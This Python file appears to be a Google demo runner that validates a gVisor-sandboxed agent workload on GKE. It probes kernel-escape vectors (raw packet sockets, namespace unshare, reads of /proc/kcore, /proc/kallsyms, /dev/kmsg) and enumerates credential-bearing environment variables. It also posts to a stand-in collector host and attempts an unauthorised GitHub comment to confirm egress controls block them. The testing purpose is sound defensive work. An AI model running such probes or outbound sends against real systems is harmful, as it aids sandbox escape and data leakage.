#!/usr/bin/env python3
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Actor runner workload for The Secure Runtime on GKE Agent Substrate."""

import contextlib
import ctypes
import importlib
import io
import json
import os
import platform
import socket
import ssl
import time
import traceback
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any

MAX_BODY_BYTES = 256 * 1024
_BOOT_START = time.monotonic()

_PRELOADED: dict[str, Any] = {}
_PRELOADED_VERSIONS: dict[str, str] = {}
for _pkg, _alias in (
    ("numpy", "np"),
    ("pandas", "pd"),
    ("scipy", "scipy"),
    ("matplotlib", "matplotlib"),
    ("httpx", "httpx"),
):
    try:
        _mod = importlib.import_module(_pkg)
        if _pkg == "scipy":
            importlib.import_module("scipy.stats")
            importlib.import_module("scipy.linalg")
        elif _pkg == "matplotlib":
            _mod.use("Agg")
        _PRELOADED[_alias] = _mod
        _PRELOADED_VERSIONS[_pkg] = getattr(_mod, "__version__", "loaded")
    except ImportError:
        if os.environ.get("RUNNER_ALLOW_MINIMAL_IMPORTS") != "1":
            raise

_WARM_IMPORT_MS = round((time.monotonic() - _BOOT_START) * 1000, 2)
_EXEC_GLOBALS: dict[str, Any] = {"__builtins__": __builtins__, **_PRELOADED}


def _read_proc_file(path: str) -> str:
    try:
        with open(path, encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError as exc:
        return f"<unavailable: {exc}>"


def _secret_env_keys() -> list[str]:
    tokens = ("TOKEN", "SECRET", "KEY", "PASSWORD", "CREDENTIAL", "GITHUB_PAT")
    return sorted(k for k in os.environ if any(t in k.upper() for t in tokens))


def collect_sandbox_info() -> dict[str, Any]:
    """Returns kernel, UID/GID, capabilities, and preloaded stack metadata."""
    cap_eff = next(
        (
            line.split(":", 1)[1].strip()
            for line in _read_proc_file("/proc/self/status").splitlines()
            if line.startswith("CapEff:")
        ),
        "",
    )
    return {
        "kernel_version": _read_proc_file("/proc/version"),
        "uname": platform.uname()._asdict(),
        "uid": os.getuid(),
        "gid": os.getgid(),
        "cap_eff": cap_eff,
        "warm_import_ms_at_boot": _WARM_IMPORT_MS,
        "preloaded_modules": dict(_PRELOADED_VERSIONS),
        "credential_env_vars_present": _secret_env_keys(),
        "ssl_cert_dir": os.environ.get("SSL_CERT_DIR", ""),
    }


def probe_kernel_boundary() -> dict[str, str]:
    """Probes 6 kernel escape and host-interface vectors inside gVisor."""
    verdicts: dict[str, str] = {}
    af_packet = getattr(socket, "AF_PACKET", 17)
    try:
        sock = socket.socket(af_packet, socket.SOCK_RAW, 0)
        sock.close()
        verdicts["af_packet_raw_socket"] = "UNEXPECTED_ALLOWED"
    except OSError as exc:
        verdicts["af_packet_raw_socket"] = (
            f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"
        )

    libc = ctypes.CDLL(None, use_errno=True)
    if libc.unshare(0x10000000 | 0x00020000) != 0:
        err = ctypes.get_errno()
        verdicts["unshare_user_mount_ns"] = (
            f"BLOCKED_BY_GVISOR (errno={err}: {os.strerror(err)})"
        )
    else:
        verdicts["unshare_user_mount_ns"] = "UNEXPECTED_ALLOWED"

    for path in (
        "/proc/kcore",
        "/proc/kallsyms",
        "/proc/sysrq-trigger",
        "/dev/kmsg",
    ):
        try:
            with open(path, "rb") as fh:
                fh.read(16)
            verdicts[path] = "UNEXPECTED_ALLOWED"
        except OSError as exc:
            verdicts[path] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"
    return verdicts


def _https_request(
    method: str,
    url: str,
    headers: dict[str, str],
    json_body: dict[str, Any] | None = None,
    timeout: float = 15.0,
) -> tuple[int, str, dict[str, str]]:
    ca_file = os.environ.get("SSL_CERT_FILE") or None
    ctx = ssl.create_default_context(cafile=ca_file)
    data = json.dumps(json_body).encode("utf-8") if json_body is not None else None
    req_headers = dict(headers)
    if data is not None:
        req_headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            raw = resp.read(65536).decode("utf-8", errors="replace")
            return resp.status, raw, {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as exc:
        raw = exc.read(65536).decode("utf-8", errors="replace")
        hdrs = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        return exc.code, raw, hdrs


def triage_github_issue(
    repo: str, issue_number: int, follow_untrusted: bool
) -> dict[str, Any]:
    """Executes out-of-sandbox credential GET and optional L7 attack probes."""
    clean_repo = repo.strip("/")
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": "Bearer ate-injected-at-egress",
        "User-Agent": "secure-runtime-runner/1.0",
    }
    steps: dict[str, Any] = {}
    get_url = f"https://api.github.com/repos/{clean_repo}/issues/{int(issue_number)}"
    status, body_text, resp_headers = _https_request("GET", get_url, headers)
    if status == 404:
        get_url = f"https://api.github.com/repos/{clean_repo}/issues?per_page=1"
        status, body_text, resp_headers = _https_request("GET", get_url, headers)

    parsed: Any = {}
    if resp_headers.get("content-type", "").startswith("application/json"):
        with contextlib.suppress(json.JSONDecodeError):
            parsed = json.loads(body_text)
    item = (
        parsed[0]
        if isinstance(parsed, list) and parsed
        else (parsed if isinstance(parsed, dict) else {})
    )
    steps["1_fetch_issue_get"] = {
        "method": "GET",
        "url": get_url,
        "status_code": status,
        "verdict": (
            "ALLOWED_WITH_INJECTED_CREDENTIAL" if status == 200 else f"HTTP_{status}"
        ),
        "issue_title": item.get("title") if isinstance(item, dict) else None,
    }

    if follow_untrusted:
        post_url = (
            f"https://api.github.com/repos/{clean_repo}/issues/"
            f"{int(issue_number)}/comments"
        )
        p_status, p_body, _ = _https_request(
            "POST",
            post_url,
            headers,
            json_body={"body": "Automated triage status update"},
        )
        steps["2_attempt_post_comment"] = {
            "method": "POST",
            "url": post_url,
            "status_code": p_status,
            "verdict": (
                "BLOCKED_403_BY_INTENT_EXTPROC"
                if p_status == 403
                else f"HTTP_{p_status}"
            ),
            "response": p_body[:240],
        }

        unlisted_url = "https://collector.example.invalid/telemetry"
        try:
            u_status, _, _ = _https_request(
                "POST",
                unlisted_url,
                headers={"User-Agent": "secure-runtime-runner/1.0"},
                json_body={"ping": "diagnostic"},
                timeout=8.0,
            )
            steps["3_attempt_unlisted_host"] = {
                "url": unlisted_url,
                "status_code": u_status,
                "verdict": (
                    "BLOCKED_BY_DEFAULT_DENY_EGRESS_GATEWAY"
                    if u_status >= 400
                    else f"HTTP_{u_status}"
                ),
            }
        except (OSError, urllib.error.URLError) as exc:
            steps["3_attempt_unlisted_host"] = {
                "url": unlisted_url,
                "verdict": "BLOCKED_BY_DEFAULT_DENY_EGRESS_GATEWAY",
                "error": str(exc),
            }

    return {
        "sandbox_credential_env_vars": _secret_env_keys(),
        "steps": steps,
    }


def execute_python_snippet(code: str) -> dict[str, Any]:
    """Executes Python code inside the stateful gVisor sandbox namespace."""
    stdout_buf, stderr_buf = io.StringIO(), io.StringIO()
    exec_start, exit_code = time.monotonic(), 0
    try:
        with (
            contextlib.redirect_stdout(stdout_buf),
            contextlib.redirect_stderr(stderr_buf),
        ):
            exec(compile(code, "<actor-sandbox>", "exec"), _EXEC_GLOBALS)
    except SystemExit as exc:
        exit_code = int(exc.code) if isinstance(exc.code, int) else 1
    except Exception:  # noqa: BLE001
        exit_code = 1
        traceback.print_exc(file=stderr_buf)
    return {
        "exit_code": exit_code,
        "stdout": stdout_buf.getvalue(),
        "stderr": stderr_buf.getvalue(),
        "duration_ms": round((time.monotonic() - exec_start) * 1000, 2),
        "warm_import_ms_saved": _WARM_IMPORT_MS,
    }


class RunnerHandler(BaseHTTPRequestHandler):
    """HTTP handler for wakeupProbe (/readyz), probes, and execution."""

    def _send_json(self, status_code: int, payload: dict[str, Any]) -> None:
        raw = json.dumps(payload).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _read_json_body(self) -> dict[str, Any] | None:
        content_len = int(self.headers.get("Content-Length", "0"))
        if content_len > MAX_BODY_BYTES:
            self._send_json(
                413, {"error": f"payload exceeds {MAX_BODY_BYTES} byte limit"}
            )
            return None
        body = self.rfile.read(content_len) if content_len > 0 else b"{}"
        try:
            parsed = json.loads(body.decode("utf-8"))
        except json.JSONDecodeError as exc:
            self._send_json(400, {"error": f"invalid JSON: {exc}"})
            return None
        if not isinstance(parsed, dict):
            self._send_json(400, {"error": "JSON object body required"})
            return None
        return parsed

    def do_GET(self) -> None:  # noqa: N802
        if self.path == "/readyz":
            self._send_json(200, {"status": "ready", "warm_import_ms": _WARM_IMPORT_MS})
        elif self.path == "/info":
            self._send_json(200, collect_sandbox_info())
        else:
            self._send_json(404, {"error": f"unknown path: {self.path}"})

    def do_POST(self) -> None:  # noqa: N802
        if self.path == "/probe-boundary":
            self._send_json(200, {"verdicts": probe_kernel_boundary()})
            return
        req = self._read_json_body()
        if req is None:
            return
        if self.path == "/triage-github-issue":
            repo = str(req.get("repo") or "GoogleCloudPlatform/accelerated-platforms")
            issue_number = int(req.get("issue_number", 42))
            follow_untrusted = bool(req.get("follow_untrusted", True))
            self._send_json(
                200, triage_github_issue(repo, issue_number, follow_untrusted)
            )
        elif self.path == "/run":
            code = req.get("code", "")
            if not isinstance(code, str) or not code.strip():
                self._send_json(400, {"error": "field 'code' is required"})
                return
            self._send_json(200, execute_python_snippet(code))
        else:
            self._send_json(404, {"error": f"unknown path: {self.path}"})

    def log_message(self, fmt: str, *args: Any) -> None:
        return


def main() -> None:
    port = int(os.environ.get("PORT", "80"))
    trust_bundle = "/run/ate/egress-trust-bundle/trust-bundle.pem"
    if os.path.exists(trust_bundle):
        os.environ.setdefault("SSL_CERT_FILE", trust_bundle)
        os.environ.setdefault("REQUESTS_CA_BUNDLE", trust_bundle)
    HTTPServer(("0.0.0.0", port), RunnerHandler).serve_forever()


if __name__ == "__main__":
    main()
